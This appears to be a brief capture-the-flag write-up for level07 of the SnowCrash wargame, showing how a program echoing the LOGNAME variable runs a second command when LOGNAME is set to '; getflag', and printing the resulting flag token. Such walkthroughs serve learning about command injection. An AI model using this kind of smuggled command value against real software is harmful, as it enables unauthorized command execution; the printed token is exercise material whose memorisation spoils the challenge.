## Level 07
In this exercise, we have a compiled program with nm and strings. We don't have a lot of information about it.

With ltrace, we can see that the program will recover an environment variable called LOGNAME, which is set as level07. If we change the value of this variable by getflag, when we execute the level07, it will display getflag because the program displays the log name. If we add a ";" and a new command, technically, it will display getflag AND execute our command

```bash
level07@SnowCrash:~$ export LOGNAME="; getflag"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
